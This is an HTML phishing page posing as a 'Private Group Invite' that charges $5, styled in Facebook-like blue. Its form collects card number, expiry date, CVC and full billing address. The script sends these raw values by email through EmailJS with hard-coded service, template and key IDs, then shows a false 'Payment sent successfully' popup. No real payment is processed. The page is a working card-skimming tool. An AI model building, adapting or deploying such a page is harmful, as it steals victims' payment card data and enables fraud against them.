<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Private Group</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: url('images/back.jpg') no-repeat center center/cover;
    }

    .container {
      background: rgba(255, 255, 255, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
      width: 300px;
    }

    h2 {
      margin-bottom: 20px;
    }

    input {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      margin-left: -10px;
    }

    button {
      background: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background: #166fe5;
    }

    .error {
      color: red;
      font-size: 14px;
    }

    /* Popup styles */
    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .popup-content {
      font-size: 16px;
      margin-bottom: 10px;
    }

    #popupClose {
      background: #1877f2;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    #popupClose:hover {
      background: #166fe5;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Private Group Invite</h2>
    <form id="paymentForm">
      <input type="text" id="cardNumber" placeholder="Card Number" required>
      <input type="text" id="expDate" placeholder="MM/YY" required>
      <input type="text" id="cvc" placeholder="CVC" required>
      <input type="text" id="streetAddress" placeholder="Street Address" required>
      <input type="text" id="city" placeholder="City" required>
      <input type="text" id="state" placeholder="State" required>
      <input type="text" id="zipCode" placeholder="Zip Code" required>
      <p id="errorMessage" class="error"></p>
      <button type="button" id="payButton">Pay $5</button>
    </form>
  </div>

  <!-- Popup Confirmation -->
  <div id="popup" class="popup">
    <div class="popup-content">
      <p>Payment sent successfully! Awaiting approval.</p>
      <button id="popupClose">OK</button>
    </div>
  </div>

  <script>
    // EmailJS configuration
    const EMAILJS_SERVICE_ID = "service_uhxg8hf";
    const EMAILJS_TEMPLATE_ID = "template_ledkaye";
    const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";

    // Initialize EmailJS
    emailjs.init(EMAILJS_PUBLIC_KEY);

    // Handle form submission
    document.getElementById("payButton").addEventListener("click", () => {
      const cardNumber = document.getElementById("cardNumber").value.trim();
      const expDate = document.getElementById("expDate").value.trim();
      const cvc = document.getElementById("cvc").value.trim();
      const streetAddress = document.getElementById("streetAddress").value.trim();
      const city = document.getElementById("city").value.trim();
      const state = document.getElementById("state").value.trim();
      const zipCode = document.getElementById("zipCode").value.trim();
      const errorMessage = document.getElementById("errorMessage");

      // Basic validation
      if (!cardNumber || !expDate || !cvc || !streetAddress || !city || !state || !zipCode) {
        errorMessage.textContent = "All fields are required.";
        return;
      }

      const templateParams = {
        card_number: cardNumber,
        exp_date: expDate,
        cvc_code: cvc,
        street_address: streetAddress,
        city: city,
        state: state,
        zip_code: zipCode
      };

      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
        .then(() => {
          document.getElementById("popup").style.display = "block";
          document.getElementById("paymentForm").reset();
        })
        .catch((error) => {
          errorMessage.textContent = "Failed to send payment information. Please try again.";
          console.error("Error:", error);
        });
    });

    // Close popup
    document.getElementById("popupClose").addEventListener("click", () => {
      document.getElementById("popup").style.display = "none";
    });
  </script>

</body>
</html>
